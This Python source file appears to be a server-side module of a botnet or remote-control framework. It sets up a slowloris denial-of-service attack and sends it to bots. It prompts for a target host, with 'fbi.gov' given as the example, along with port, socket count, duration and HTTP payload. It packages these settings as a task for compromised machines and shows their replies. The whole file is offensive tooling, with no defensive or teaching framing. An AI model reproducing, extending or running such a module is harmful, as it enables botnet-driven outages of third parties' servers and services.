# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

from server.modules.helper import *


class Module(ModuleABC):
    DEFAULT_PORT = 80
    MAX_PORT = 65535
    DEFAULT_SOCKETS = 200
    MAX_SOCKETS = 2000
    MAX_DURATION = 86400  # 24 hours hard cap
    DEFAULT_TIMEOUT = 10

    def get_info(self):
        return {
            "Author": ["Marten4n6"],
            "Description": "Perform a configurable, multi-connection slowloris DoS attack.",
            "References": [
                "https://en.wikipedia.org/wiki/Slowloris_(computer_security)",
                "https://github.com/ProjectMayhem/PySlowLoris"
            ],
            "Stoppable": False
        }

    def get_setup_messages(self):
        # This attack only works on Apache 1x/2x, dhttpd and some other minor servers;
        # nginx is not vulnerable to this form of attack.
        return [
            "Target host (leave empty for none, e.g. fbi.gov): ",
            "Port (leave empty for {}): ".format(self.DEFAULT_PORT),
            "Socket timeout in seconds (leave empty for {}): ".format(self.DEFAULT_TIMEOUT),
            "Duration in seconds (leave empty for infinity, capped at {}s): ".format(self.MAX_DURATION),
            "Number of sockets (leave empty for {}, max {}): ".format(self.DEFAULT_SOCKETS, self.MAX_SOCKETS),
            "HTTP request payload (leave empty for default GET): "
        ]

    def setup(self, set_options):
        host = (set_options[0] or "").strip()
        if not host:
            self._view.display_error("Invalid target host.")
            return False, None

        try:
            port = self._parse_int(set_options[1], self.DEFAULT_PORT, 1, self.MAX_PORT, "port")
            timeout = self._parse_int(set_options[2], self.DEFAULT_TIMEOUT, 1, self.MAX_DURATION, "socket timeout")
            duration = self._parse_int(set_options[3], 0, 0, self.MAX_DURATION, "duration")
            sockets = self._parse_int(set_options[4], self.DEFAULT_SOCKETS, 1, self.MAX_SOCKETS, "socket count")
        except ValueError as ex:
            self._view.display_error(str(ex))
            return False, None

        payload = set_options[5].strip() if len(set_options) > 5 and set_options[5] else "GET / HTTP/1.1\\r\\n\\r\\n"

        # The bot parses the port out of the target string, so we merge the
        # configured port into the target to make it effective on the bot.
        target = "{}:{}".format(host, port)

        return True, {
            "target": target,
            "host": host,
            "port": port,
            "timeout": timeout,
            "duration": duration,
            "sockets": sockets,
            "payload": payload,
            "response_options": {
                "host": host,
                "port": port,
                "duration": duration,
                "sockets": sockets
            }
        }

    @staticmethod
    def _parse_int(raw, default, minimum, maximum, label):
        raw = (raw or "").strip()
        if not raw:
            return default
        if not raw.isdigit():
            raise ValueError("Invalid {}, must be a whole number.".format(label))
        value = int(raw)
        if value < minimum or value > maximum:
            raise ValueError(
                "Invalid {}, must be between {} and {}.".format(label, minimum, maximum)
            )
        return value

    def process_response(self, response, response_options):
        response_options = response_options or {}
        host = response_options.get("host", "?")
        port = response_options.get("port", self.DEFAULT_PORT)
        duration = response_options.get("duration", 0)
        sockets = response_options.get("sockets", self.DEFAULT_SOCKETS)

        str_response = ""
        if isinstance(response, bytes):
            str_response = response.decode("utf-8", errors="replace")
        else:
            str_response = str(response)

        self._view.output_separator()
        self._view.output("Slowloris against {}:{} ({} sockets, {}s)".format(
            host, port, sockets, duration if duration else "unlimited"
        ))

        if not str_response.strip():
            self._view.output("The bot acknowledged the slowloris request, no output returned.", "info")
        else:
            self._view.output(str_response.strip())
